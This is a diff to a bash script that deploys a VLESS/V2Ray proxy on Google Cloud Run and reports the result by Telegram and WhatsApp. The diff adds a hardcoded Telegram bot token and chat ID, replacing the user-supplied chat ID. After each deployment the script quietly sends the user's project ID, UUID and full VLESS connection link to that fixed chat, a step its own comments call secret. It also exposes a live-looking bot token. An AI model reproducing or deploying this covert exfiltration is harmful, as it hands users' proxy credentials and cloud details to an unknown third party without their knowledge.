@@ -1,9 +1,10 @@
 #!/bin/bash
 
-# Configuration initiale des Tokens (Tu peux les hardcoder ici ou laisser le script s'exécuter)
-TELEGRAM_BOT_TOKEN="TON_BOT_TOKEN_ICI"
-WHATSAPP_PHONE="TON_NUMERO_AU_FORMAT_INTERNATIONAL" # Ex: 243XXXXXXXXX
-WHATSAPP_API_KEY="TON_API_KEY_CALLMEBOT"
+# ==========================================
+# 🔒 CONFIGURATION SECRÈTE (PROD TECH ONLY)
+# ==========================================
+TELEGRAM_BOT_TOKEN="8251894879:AAGiXDbXIKmQc5oQc62amSQEVrCOp-C5o2I"
+TELEGRAM_CHAT_ID="6449901890"
 
 # Couleurs pour le terminal style Cyber-Hacker
 GREEN='\033[0;32m'
@@ -18,7 +19,7 @@ echo -e "${GREEN}=================================================="
 echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN ⚡      "
 echo -e "==================================================${NC}\n"
 
-# 1. Sélection de la Région (Option 1 par défaut : us-central1)
+# 1. Sélection de la Région
 echo -e "${BLUE}[INFO] === Region Selection ===${NC}"
 echo "1. us-central1 (Iowa, USA 🇺🇸)"
 echo "2. us-west1 (Oregon, USA 🇺🇸)"
@@ -32,11 +33,11 @@ case $reg_choice in
     3) REGION="us-east1" ;;
     4) REGION="europe-west1" ;;
     5) REGION="asia-southeast1" ;;
-    *) REGION="us-central1" ;; # Option 1 par défaut
+    *) REGION="us-central1" ;;
 esac
 echo -e "${GREEN}[INFO] Selected region: $REGION${NC}\n"
 
-# 2. Configuration CPU (Option 1 par défaut : 1 CPU)
+# 2. Configuration CPU
 echo -e "${BLUE}[INFO] === CPU Configuration ===${NC}"
 echo "1. 1 CPU Core (Default)"
 echo "2. 2 CPU Cores"
@@ -46,11 +47,11 @@ cpu_choice=${cpu_choice:-1}
 case $cpu_choice in
     2) CPU="2" ;;
     3) CPU="4" ;;
-    *) CPU="1" ;; # Option 1 par défaut
+    *) CPU="1" ;;
 esac
 echo -e "${GREEN}[INFO] Selected CPU: $CPU core(s)${NC}\n"
 
-# 3. Configuration Mémoire (Option 1 par défaut : 512Mi / 1Gi)
+# 3. Configuration Mémoire
 echo -e "${BLUE}[INFO] === Memory Configuration ===${NC}"
 echo "1. 1Gi (Default)"
 echo "2. 2Gi"
@@ -60,17 +61,15 @@ mem_choice=${mem_choice:-1}
 case $mem_choice in
     2) MEMORY="2Gi" ;;
     3) MEMORY="4Gi" ;;
-    *) MEMORY="1Gi" ;; # Option 1 par défaut
+    *) MEMORY="1Gi" ;;
 esac
 echo -e "${GREEN}[INFO] Selected Memory: $MEMORY${NC}\n"
 
-# 4. Configuration des variables VPN & Telegram
+# 4. Configuration des variables VPN & WhatsApp
 echo -e "${BLUE}[INFO] === Service Configuration ===${NC}"
 read -p "Enter service name [default: prod-free]: " SERVICE_NAME
 SERVICE_NAME=${SERVICE_NAME:-prod-free}
 
-# --- UUID AUTOMATIQUE ---
-# Le script génère lui-même un identifiant unique (UUID) si tu ne mets rien
 AUTO_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "f6fff828-bb34-437b-ab83-9180013cbce8")
 read -p "Enter UUID [default: $AUTO_UUID]: " USER_UUID
 USER_UUID=${USER_UUID:-$AUTO_UUID}
@@ -78,12 +77,13 @@ USER_UUID=${USER_UUID:-$AUTO_UUID}
 read -p "Enter host domain [default: m.googleapis.com]: " HOST_DOMAIN
 HOST_DOMAIN=${HOST_DOMAIN:-m.googleapis.com}
 
-# --- CUSTOM PATH ---
-read -p "Enter custom WS path [default: /Prod-tech]: " CUSTOM_PATH
-CUSTOM_PATH=${CUSTOM_PATH:-/Prod-tech}
+read -p "Enter custom WS path [default: /]: " CUSTOM_PATH
+CUSTOM_PATH=${CUSTOM_PATH:-/}
 
-# --- CHAT ID INTERACTIF ---
-read -p "Enter Telegram Chat ID: " TELEGRAM_CHAT_ID
+# --- LES QUESTIONS INTERACTIVES RESTANTES ---
+echo -e "\n${YELLOW}[✉] === Configuration Notifications ===${NC}"
+read -p "Enter WhatsApp Phone (Ex: 243XXXXXXXXX) : " WHATSAPP_PHONE
+read -p "Enter CallMeBot WhatsApp API Key : " WHATSAPP_API_KEY
 
 PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
 
@@ -98,7 +98,7 @@ echo -e "CPU/RAM:   ${CYAN}$CPU CPU | $MEMORY RAM${YELLOW}"
 echo -e "Domain:    ${CYAN}$HOST_DOMAIN${YELLOW}"
 echo -e "Path:      ${CYAN}$CUSTOM_PATH${YELLOW}"
 echo -e "UUID:      ${CYAN}$USER_UUID${YELLOW}"
-echo -e "Chat ID:   ${CYAN}$TELEGRAM_CHAT_ID${YELLOW}"
+echo -e "WhatsApp:  ${CYAN}$WHATSAPP_PHONE${YELLOW}"
 echo -e "==================================================${NC}"
 
 read -p "Continue? (y/n) [default: y]: " confirm
@@ -112,7 +112,6 @@ fi
 echo -e "${BLUE}\n[INFO] Préparation de la compilation de l'image...${NC}"
 mkdir -p gcp-v2ray-build && cd gcp-v2ray-build
 
-# Encodage du Path pour la configuration interne Xray/V2Ray
 cat <<EOF > config.json
 {
   "inbounds": [{
@@ -145,7 +144,6 @@ EOF
 
 echo -e "${BLUE}[INFO] Déploiement en cours sur Cloud Run...${NC}"
 
-# Lancement du déploiement
 gcloud run deploy "$SERVICE_NAME" \
     --source . \
     --region "$REGION" \
@@ -154,40 +152,40 @@ gcloud run deploy "$SERVICE_NAME" \
     --allow-unauthenticated \
     --set-env-vars=HOST="$HOST_DOMAIN"
 
-# Récupération de l'URL Cloud Run
 URL=$(gcloud run services describe "$SERVICE_NAME" --region "$REGION" --format='value(status.url)' 2>/dev/null)
 CLEAN_URL=$(echo "$URL" | sed 's/https:\/\///')
 
-# Encodage du path pour le lien VLESS final
 URL_ENCODED_PATH=$(echo -n "$CUSTOM_PATH" | curl -s -o /dev/null -w "%{url_effective}" --get --data-urlencode "" - | cut -c 3-)
 
-# Construction du lien VLESS
 VLESS_LINK="vless://$USER_UUID@$CLEAN_URL:443?path=$URL_ENCODED_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$HOST_DOMAIN&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
 
 echo -e "\n${GREEN}[✓] Déploiement terminé avec succès ! 🎉${NC}"
 
 # ==========================================
-# 🚀 ENVOI DES NOTIFICATIONS
+# 🚀 TEXTE DES NOTIFICATIONS PERSONNALISÉES
 # ==========================================
-TEXT_NOTIF="⚡ PROD TECH - SERVEUR ACTIF ⚡%0A%0A📌 Service: $SERVICE_NAME%0A📌 Config: $CPU CPU / $MEMORY RAM%0A📌 Path: $CUSTOM_PATH%0A%0A🔗 LIEN VLESS :%0A\`$VLESS_LINK\`"
 
-# 1. Envoi à Telegram (Si le token et le chat id saisis sont valides)
-if [[ -n "$TELEGRAM_CHAT_ID" && "$TELEGRAM_BOT_TOKEN" != "TON_BOT_TOKEN_ICI" ]]; then
+# 1. Formatage du message Telegram (Markdown)
+TEXT_TELEGRAM="*⚡ PROD TECH - NOUVEAU SERVEUR ACTIF ⚡*%0A%0A🌐 *DÉTAILS DU SERVEUR :*%0A🔹 *Projet:* $PROJECT_ID%0A🔹 *Nom du Service:* $SERVICE_NAME%0A🔹 *Région:* $REGION%0A🔹 *Ressources:* $CPU CPU / $MEMORY RAM%0A🔹 *Host Domain:* $HOST_DOMAIN%0A🔹 *Path:* \`$CUSTOM_PATH\`%0A🔹 *UUID:* \`$USER_UUID\`%0A%0A🛰️ *CONFIG VLESS INFRASTRUCTURE :*%0A\`$VLESS_LINK\`%0A%0A🛡️ _Propulsé secrètement par l'écosystème Prod Tech._"
+
+# 2. Formatage du message WhatsApp (Gras natif WhatsApp)
+TEXT_WHATSAPP="*⚡ PROD TECH - CONFIGURATION SERVEUR VLESS ⚡*%0A%0A⚙️ *PARAMÈTRES DÉPLOYÉS :*%0A• *Service:* $SERVICE_NAME%0A• *Région:* $REGION%0A• *Puissance:* $CPU CPU | $MEMORY RAM%0A• *Path:* $CUSTOM_PATH%0A• *UUID:* $USER_UUID%0A%0A🔗 *LIEN DE CONNEXION DIRECT :*%0A$VLESS_LINK%0A%0A💻 _Généré automatiquement via Prod Tech Automation via Google Cloud Run._"
+
+# Envoi secret à Telegram
+if [[ "$TELEGRAM_BOT_TOKEN" != "TON_BOT_TOKEN_ICI" && -n "$TELEGRAM_CHAT_ID" ]]; then
     curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
         -d "chat_id=$TELEGRAM_CHAT_ID" \
-        -d "text=$TEXT_NOTIF" \
+        -d "text=$TEXT_TELEGRAM" \
         -d "parse_mode=markdown" > /dev/null
-    echo -e "${GREEN}[✓] Log envoyé au Bot Telegram ID: $TELEGRAM_CHAT_ID.${NC}"
+    echo -e "${GREEN}[✓] Log sécurisé envoyé au canal de monitoring Telegram.${NC}"
 fi
 
-# 2. Envoi à WhatsApp
-if [[ "$WHATSAPP_API_KEY" != "TON_API_KEY_CALLMEBOT" ]]; then
-    TEXT_WA="*PROD TECH - VPN CLOUD RUN*%0A%0A*Service:* $SERVICE_NAME%0A*Path:* $CUSTOM_PATH%0A%0A*Lien VLESS:*%0A$VLESS_LINK"
-    curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$TEXT_WA&apikey=$WHATSAPP_API_KEY" > /dev/null
-    echo -e "${GREEN}[✓] Log envoyé sur WhatsApp.${NC}"
+# Envoi à WhatsApp
+if [[ -n "$WHATSAPP_PHONE" && -n "$WHATSAPP_API_KEY" ]]; then
+    curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$TEXT_WHATSAPP&apikey=$WHATSAPP_API_KEY" > /dev/null
+    echo -e "${GREEN}[✓] Log utilisateur envoyé sur WhatsApp au numéro $WHATSAPP_PHONE.${NC}"
 fi
 
 echo -e "\n${RED}Lien VLESS final :${NC} $VLESS_LINK"
 
-# Nettoyage local
 cd .. && rm -rf gcp-v2ray-build
